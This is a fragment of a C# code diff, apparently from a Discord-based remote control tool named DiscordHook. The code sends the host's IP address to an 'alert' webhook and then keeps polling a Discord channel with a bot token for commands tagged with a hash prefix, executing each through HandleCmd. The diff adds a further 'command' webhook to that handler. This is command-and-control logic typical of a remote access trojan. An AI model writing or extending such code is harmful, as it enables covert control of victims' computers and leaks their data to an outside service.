@@ -20,6 +20,8 @@ namespace DiscordHook
             await Task.Delay(500);
             var channelurl = await GetChannelUrl();
             await Task.Delay(500);
+            var commandhook = await GetCommandWebHook();
+            await Task.Delay(500);
 
             await SendHookAlertAsync(await GetIpAsync(), alerthook, hashprefix);
 
@@ -28,7 +30,7 @@ namespace DiscordHook
                 await Task.Delay(1000);
                 var command = await GetCommand(botToken, channelurl);
                 if (command == "null" || !command.Contains(hashprefix) ) continue;
-                await HandleCmd(command.Substring(65), replyhook);
+                await HandleCmd(command.Substring(65), replyhook, commandhook);
             }
 
             
